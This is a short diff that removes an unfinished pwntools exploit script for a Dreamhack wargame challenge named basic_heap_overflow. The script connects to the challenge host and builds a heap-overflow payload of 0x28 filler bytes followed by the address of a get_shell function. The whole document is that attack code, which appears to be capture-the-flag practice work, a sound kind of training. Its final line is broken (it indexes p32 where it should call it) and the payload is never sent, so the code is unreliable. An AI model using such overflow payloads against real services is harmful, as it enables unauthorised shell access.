@@ -1,8 +1,0 @@
-from pwn import *
-
-p=remote("host3.dreamhack.games", "21540")
-
-elf=ELF('./basic_heap_overflow')
-get_shell=elf.symbols['get_shell']
-payload='A'*0x28
-payload+=p32['get_shell']
